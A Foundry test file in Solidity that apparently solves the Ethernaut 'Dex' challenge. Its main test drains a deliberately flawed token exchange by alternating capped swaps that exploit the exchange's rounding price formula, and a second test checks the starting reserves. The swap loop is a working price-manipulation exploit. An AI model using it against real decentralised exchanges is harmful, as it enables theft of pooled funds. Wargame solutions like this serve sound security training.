// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {EthernautDex, DexAttack} from "../../src/ethernaut/Dex.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract DexTest is Test {
    EthernautDex level;
    DexAttack attack;
    DamnValuableToken token1;
    DamnValuableToken token2;
    address player = makeAddr("player");

    function setUp() public {
        token1 = new DamnValuableToken();
        token2 = new DamnValuableToken();
        level = new EthernautDex(address(token1), address(token2));
        attack = new DexAttack();
        token1.transfer(address(level), 100);
        token2.transfer(address(level), 100);
        token1.transfer(player, 10);
        token2.transfer(player, 10);
    }

    function testDexExploitDrainsReserves() public {
        vm.startPrank(player);
        token1.approve(address(level), type(uint256).max);
        token2.approve(address(level), type(uint256).max);
        level.approve(address(level), type(uint256).max);

        // Alternate swaps, capping each amount at the source reserve so the
        // buggy price formula never asks for more than the dex holds.
        while (token1.balanceOf(address(level)) > 0 && token2.balanceOf(address(level)) > 0) {
            uint256 amt = token1.balanceOf(player);
            uint256 cap = token1.balanceOf(address(level));
            if (amt > cap) amt = cap;
            if (amt > 0) level.swap(address(token1), address(token2), amt);

            amt = token2.balanceOf(player);
            cap = token2.balanceOf(address(level));
            if (amt > cap) amt = cap;
            if (amt > 0) level.swap(address(token2), address(token1), amt);
        }
        vm.stopPrank();

        assertLt(token1.balanceOf(address(level)), 100);
        assertLt(token2.balanceOf(address(level)), 100);
    }
}

contract DexControlTest is Test {
    function testInitialReserves() public {
        DamnValuableToken token1 = new DamnValuableToken();
        DamnValuableToken token2 = new DamnValuableToken();
        EthernautDex level = new EthernautDex(address(token1), address(token2));
        token1.transfer(address(level), 100);
        token2.transfer(address(level), 100);
        assertEq(token1.balanceOf(address(level)), 100);
        assertEq(token2.balanceOf(address(level)), 100);
    }
}

// end

